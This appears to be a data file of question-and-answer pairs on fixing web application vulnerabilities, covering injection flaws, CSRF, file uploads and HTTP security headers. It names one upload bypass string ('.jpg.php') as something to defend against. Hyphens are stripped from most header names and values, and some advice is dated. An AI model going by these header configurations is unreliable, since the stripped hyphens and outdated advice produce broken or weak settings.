How to resolve Filename injection Path traversal?,"The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included on the page, and then use an identifier (for example the index number) to access the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path."
How to resolve XSS injection?,"In order to prevent XSS injections, all userinput should be escaped or encoded. You could start by sanitizing userinput as soon as it is inserted into the application, by preference using a so called whitelisting method. This means you should not check for malicious content like the tags or anything, but only allow the expected input. Every input which is outside of the intended operation of the application should immediately be detected and login rejected. Do not try to help use the input in any way because that could introduce a new type of attack by converting characters. The second step would be encoding all the parameters or userinput before putting this in your html with encoding libraries specially designed for this purpose.You should take into consideration that there are several contexts for encoding userinput for escaping XSS injections. These contexts are amongst others:HTML encoding is for whenever your userinput is displayed directly into your HTML. HTML attribute encoding is the type of encoding/escaping that should be applied whenever your user input is displayed into the attribute of your HTML tags. HTML URL encoding ;This type of encoding/escaping should be applied to whenever you are using userinput into a HREF tag.JavaScript encoding should be used whenever parameters are rendered via JavaScript; your application will detect normal injections in the first instant. But your application still remains vulnerable to JavaScript encoding which will not be detected by the normal encoding/escaping methods."
How to resolve Command injection?,Userinput that is used in a shell command should not contain dangerous characters. A blacklist of characters is not a good option because it may be difficult to think of all of the characters to validate against. A white list containing only allowable characters should be created to validate the userinput.
How to resolve Cross site request forgery?,"To arm an application against automated attacks and tooling you need to use unique tokens which are included into the forms of an application, API calls or AJAX requests. Any state changing operation requires a secure random token (e.g CSRF token) to prevent against CSRF attacks. Characteristics of a CSRF Token are a unique, large random value generated by a cryptographically secure random number generator.The CSRF token is then added as a hidden field for forms and validated on the sever side whenever a user is sending a request to the server.Note : Whenever the application is an REST service and is using tokens such as JWT tokens, whenever these tokens are being sent in the application headers rather than stored in cookies the application should not be suspectible to CSRF attacks for a succesfull CSRF attacke depends on the browsers cookie jar."
How to resolve XXE injections?,Disable the possibility to fetch resources from an external source. This is normally done in the configuration of the used XML parser.
How to resolve X Path injections?,"Just like the techniques to avoid SQL injection, you need to use a parameterised XPath interface if one is available, or escape the user input to make it safe to include in a dynamically constructed query. If you are using quotes to terminate untrusted input in a dynamically constructed XPath query, then you need to escape that quote in the untrusted input to ensure the untrusted data can not try to break out of that quoted context."
How to resolve XML injection?,"In addition to the existing input validation, define a positive approach which escapes/encodes characters that can be interpreted as XML. At a minimum this includes the following: < > / "" '"
How to resolve XSLT injections?,To protect against such vulnerability one needs to make sure that he does not use usersupplied input in the XSL filename. The best solution would be to define a list of permitted filenames and only accept XSL filenames from that list.
How to resolve External DTD parsing?,Disable the XML DTD (Document Type Definition) parsing. This can be set when initiating the XML parser.
How to resolve LDAP injection?,"The best way to prevent LDAP injection is to use a positive validation scheme for ensuring that the data going into your queries does not contain any attacks. However, in some cases, it is necessary to include special characters in the input that is passed into an LDAP query. In this case, using escaping can prevent the LDAP interpreter from thinking those special characters are actually part of the LDAP query."
How to resolve SSI injections?,The SSI handler on the webserver should not be activated when it is not used.
How to resolve File upload injections?,"Uploaded files always need to be placed outside the document root of the webserver.You should also check the userinput(filename) for having the right allowed extensions such as .jpg, .png etc.Note: when checking these extensions always make sure your application validates the last possible extension so an attacker could not simply inject "".jpg.php"" and bypass your validationAfter this validation, you must also check the userinput(filename) for containing possible path traversal patterns in order to prevent him from uploading outside of the intended directory.Most developers also do a mimetype check. This is a good protection however not whenever you are checking this mimetype through the post request. This header can not be trusted since it can be easily manipulated by an attacker.The best way to check the mimetype is to extract the file from the server after uploading and check it from the file itself. Deleting it whenever it does not comply with expected values.You may also want to check if the filenames do already exist before uploading in order to prevent the overwriting of files.Also for serving the files back there needs to be a file handler function that can select the file based on an identifier that will serve the file back towards the user."
How to resolve Version management?,"One option is not to use components that you did not write. But that is not very realistic.Most component projects do not create vulnerability patches for old versions. Instead, most simply fix the problem in the next version. So upgrading to these new versions is critical. Software projects should have a process in place to:Identify all components and the versions you are using, including all dependencies. (e.g., the versions plugin).Monitor the security of these components in public databases, project mailing lists, and security mailing lists, and keep them up to date.Establish security policies governing components use, such as requiring certain software development practices, passing security tests, and acceptable licenses.Where appropriate, consider adding security wrappers around components to disable unused functionality and/ or secure weak or vulnerable aspects of the component.This also goes for all other components that should be up to date with proper security configuration(s) and version(s) such as server OS etc.This should include removal of unneeded configurations and folders such as sample applications, platform documentation, and default or example users."
How to resolve Verbose error messaging?,The level of debugging information needs to be determined according to the environment where the code is running.
How to resolve Debug enabeling?,Disable the possibility to enable debug information on a live environment.
How to resolve Robots.txt?,Instead of the blacklisting method:Useragent: * Disallow: /squirrelmail/ Disallow: /admin/ Disallow: /modules/You should use a whitelisting method:Useragent: * Disallow: * Allow: /index.html Allow: /home.html
How to resolve Accessible non parsed dynamic scripts?,Always add the different types of extensions to the webserver handler to parse. This way the file source cannot be viewed.
How to resolve Include anti caching headers?,"These headers are also known as the: Cachecontrol: nostore,nocache and provide protection of sensitive information when implemented in the application or webserver.Rightly configured anti caching headers will look like the following as a response Expires: Tue, 03 Jul 2001 06:00:00 GMT LastModified: {now} GMT CacheControl: nostore, nocache, mustrevalidate, maxage=0 CacheControl: postcheck=0, precheck=0 Pragma: nocache"
How to resolve Include anti clickjacking headers?,"To avoid your application from being clickjacked you can add the XframeOptions header to your application. These headers can be configured as: XframeOptions: denyThe page cannot be displayed in a frame, regardless of the site attempting to do so. XFrameOptions: sameorign The page can only be displayed in a frame on the same origin as the page itself. XFrameOptions: ALLOWFROM uriThe page can only be displayed in a frame on the specified origin.You may also want to consider to include ""Framebreaking/Framebusting"" defense for legacy browsers that do not support XFrameOption headers.Source: https://www.codemagi.com/blog/post/194"
How to resolve Include X XSS?,These headers are also known as the: XXSSProtection: 1; mode=block and provide protection against XSS attacks when implemented in the application or webserver.NOTE: This header only protects against some reflected XSS attacks. This is no substitute for normal escaping and input filtering and sanitization.
How to resolve Include X Content Type Options header?,These headers are also known as the: XContentTypeOptions: nosniff; and provide protection against Mime content type attacks when implemented in the application or webserver.
How to resolve Include Strict Transport Security header?,"These headers are also known as the: StrictTransportSecurity: maxage=16070400: includeSubDomains and provide protection against SSL Strip attacks when implemented in the application or web server.When connecting to an HSTS host for the first time, the browser won't know whether or not to use a secure connection, because it has never received an HSTS header from that host. Consequently, an active network attacker could prevent the browser from ever connecting securely (and even worse, the user may never realize something is amiss). To mitigate this attack, you can add your application to a preload list which makes HSTS enforced by default. When a user connects to one of these hosts for the first time, the browser will know that it must use a secure connection. If a network attacker prevents secure connections to the server, the browser will not attempt to connect over an insecure protocol, thus maintaining the user's security.Visit: https://hstspreload.appspot.com/ Here you can find how to add your application to HSTS preload"
